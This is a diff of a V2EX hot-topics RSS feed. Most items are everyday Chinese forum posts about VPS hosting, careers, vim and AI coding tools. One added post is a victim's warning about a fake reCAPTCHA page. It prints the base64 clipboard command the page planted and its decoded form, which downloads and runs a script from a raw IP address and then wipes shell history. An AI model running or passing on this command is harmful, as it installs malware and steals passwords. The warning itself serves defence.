@@ -4,7 +4,7 @@
     <title>V2EX Hot Topics</title>
     <link>https://www.v2ex.com/?tab=hot</link>
     <description>Hot topics from V2EX</description>
-    <lastBuildDate>Fri, 19 Jun 2026 22:42:08 GMT</lastBuildDate>
+    <lastBuildDate>Fri, 19 Jun 2026 23:58:56 GMT</lastBuildDate>
     <item>
       <title>端午节快乐！求推荐高质量 VPS 线路</title>
       <link>https://www.v2ex.com/t/1221493</link>
@@ -45,6 +45,14 @@
       <description>80 尾的，现在在一个私企公司，目前 3w x 12 ，公司业务属于金融擦边性质，年初已经感觉到组织变化，已经没有什么上升空间了，被当做工具人使用，PUA 文化严重，价值观严重不一致，心累的一匹，一天工作强度在 10-11 小时。现在有个收入砍半的国企岗位，工作内容差不多算技术负责人，对接内部需求和外部服务商，朝九晚五，工作强度不大，业务相对稳定。各位怎么看？不想躺平，但是缺失了目标的感觉，近半年代码都是 ai 写，跑通了除需求之外的 方案设计、自动化单元测试、简单集成场景测试、自动化 cr 全流程。娃马上初中了，感觉整个小学阶段就没管过娃，有点愧疚</description>
     </item>
     <item>
+      <title>vim 真的好用吗？</title>
+      <link>https://www.v2ex.com/t/1221499</link>
+      <guid>v2ex-1221499</guid>
+      <pubDate>Fri, 19 Jun 2026 03:04:23 GMT</pubDate>
+      <description>&lt;p&gt;我下过 vscode 的 vim 插件，也用过 vim 命令，但是感觉用起来非常得难受，也经常搞错当前是编辑模式还是命令模式，这东西用多了后真的会变得熟练吗？&lt;/p&gt;
+</description>
+    </item>
+    <item>
       <title>目前海外 esim 手机号在国内，哪个最好？</title>
       <link>https://www.v2ex.com/t/1221525</link>
       <guid>v2ex-1221525</guid>
@@ -53,11 +61,24 @@
 </description>
     </item>
     <item>
-      <title>vim 真的好用吗？</title>
-      <link>https://www.v2ex.com/t/1221499</link>
-      <guid>v2ex-1221499</guid>
-      <pubDate>Fri, 19 Jun 2026 03:04:23 GMT</pubDate>
-      <description>&lt;p&gt;我下过 vscode 的 vim 插件，也用过 vim 命令，但是感觉用起来非常得难受，也经常搞错当前是编辑模式还是命令模式，这东西用多了后真的会变得熟练吗？&lt;/p&gt;
+      <title>一个 reCAPTCHA 把我骗到重装系统，分享出来给大家提个醒</title>
+      <link>https://www.v2ex.com/t/1221581</link>
+      <guid>v2ex-1221581</guid>
+      <pubDate>Fri, 19 Jun 2026 15:25:09 GMT</pubDate>
+      <description>&lt;p&gt;昨天想查一下今天龙舟赛的安排，就用 DuckDuckGo 快速搜了一下，点进一个网站。&lt;a href=&quot;https://hkcdba.org/hkidbr&quot; rel=&quot;nofollow&quot;&gt;https://hkcdba.org/hkidbr&lt;/a&gt; （后面查又说是官方网站，是被黑了吗？）&lt;/p&gt;
+&lt;p&gt;打开之后，弹出了标准的 &quot;I&#39;m not a robot&quot; reCAPTCHA 验证。我很自然地就准备开始点图片验证，结果这次等来的压根不是图片，而是直接弹出了一张指引图，一步一步教我怎么打开终端，粘贴进去运行。应该是在我点击验证的时候，就已经把那段命令自动复制到我的剪贴板了。我当时也没多想，平时 github 里粘贴命令运行已经形成肌肉记忆了，鬼使神差地打开终端，直接粘贴，按下了回车。&lt;/p&gt;
+&lt;p&gt;运行的命令是这样的&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;echo &#39;I am not a robot - reCAPTCHA Verification ID: 432426&#39; &amp;amp;&amp;amp; echo &#39;ZXhwb3J0IFNSQ19VUkw9J2h0dHBzOi8vaGtjZGJhLm9yZy8nICYmIChjZCAvdG1wICYmIGN1cmwgLWtmc1NMICJodHRwOi8vNjIuNjAuMTU1LjE0My80ZjZiYjEyZjk4NDI4N2Q/Zm9yY2U9MSIgLW8gLk5lcWdnZiAmJiBiYXNoIC5OZXFnZ2YgJiYgcm0gLWYgLk5lcWdnZikgPiAvZGV2L251bGwgMj4mMSAmIGNsZWFyOyBwcmludGYgJ1wwMzNbM0onOyBoaXN0b3J5IC1kICQoaGlzdG9yeSAxIDI+L2Rldi9udWxsIHwgYXdrICd7cHJpbnQgJDF9JykgMj4vZGV2L251bGw7IGZjIC1wIC9kZXYvbnVsbCAyPi9kZXYvbnVsbDsgcHJpbnRmICdcbiAgXDAzM1szMm1ceGUyXHg5Y1x4OTMgVmVyaWZpY2F0aW9uIHN1Y2Nlc3NmdWxcMDMzWzBtXG5cbic=&#39; | base64 -D 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;把里面的 base64 解析出来是这个&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;export SRC_URL=&#39;https://hkcdba.org/&#39; &amp;amp;&amp;amp; (cd /tmp &amp;amp;&amp;amp; curl -kfsSL &quot;http://62.60.155.143/4f6bb12f984287d?force=1&quot; -o .Neqggf &amp;amp;&amp;amp; bash .Neqggf &amp;amp;&amp;amp; rm -f .Neqggf) &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp; clear; printf &#39;\033[3J&#39;; history -d $(history 1 2&amp;gt;/dev/null | awk &#39;{print $1}&#39;) 2&amp;gt;/dev/null; fc -p /dev/null 2&amp;gt;/dev/null; printf &#39;\n  \033[32m\xe2\x9c\x93 Verification successful\033[0m\n\n&#39;%
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;命令执行完，终端里立刻用绿色大字打印出了 &quot;Verification successful&quot;。回到网页并没有变化。&lt;/p&gt;
+&lt;p&gt;但真正的异常才刚刚开始。没过几秒钟，系统突然弹出一个提示，说有一个后台任务正在运行，而且这个任务被伪装成了系统更新进程 &quot;softwareupdate&quot;。&lt;/p&gt;
+&lt;p&gt;我赶紧去取消这个后台活动，但紧接着，没过多久屏幕上又弹出一个无法关闭的对话框，声称“系统软件已损坏”，要求我输入用户密码。&lt;/p&gt;
+&lt;p&gt;这时候我已经完全清醒了，不敢再输入任何东西。那个弹窗关也关不掉，我赶紧电源键强制重启。&lt;/p&gt;
+&lt;p&gt;重启之后问了下 deepseek ，然后赶紧把网络给掐了。后面查 plist ，发现有个伪装的 softwareupdate 的配置。然后今天预约了天才吧把全盘格式化重装了个系统。&lt;/p&gt;
 </description>
     </item>
     <item>
@@ -70,14 +91,6 @@
 &lt;p&gt;痛定思痛，反思流程问题，于是整理出前端文档，找 ChatGPT 网页端生成组件和布局的示意图，包含各种状态。再让 Codex 根据示意图和文档绘制界面，再修改文档修复 bug ，改完以后找 ChatGPT 重新生成最新版本的示意图。&lt;/p&gt;
 &lt;p&gt;这个过程真的很漫长，因为端到端测试都要自己来，而且还不放心，还要再开一个窗口让 Codex review 代码。&lt;/p&gt;
 &lt;p&gt;其实我之前尝试过 Claude Design 和 Claude Code 协作写前端，但细节有很多问题，Claude Code 也处理不好。我想请教一下大家，是前端本来就如此复杂，还是我的流程有问题导致如此繁琐？&lt;/p&gt;
-</description>
-    </item>
-    <item>
-      <title>GitHub copilot 重新恢复订阅了</title>
-      <link>https://www.v2ex.com/t/1221510</link>
-      <guid>v2ex-1221510</guid>
-      <pubDate>Fri, 19 Jun 2026 04:39:50 GMT</pubDate>
-      <description>&lt;p&gt;之前 4 月份下旬似乎不再接受新订阅了。今天试了下，发现能恢复了。虽然性价比比以前差了很多，但是我感觉 vs code 用起来还是最顺的，修改也最精准。准备先用个 $10 套餐试试。&lt;/p&gt;
 </description>
     </item>
   </channel>
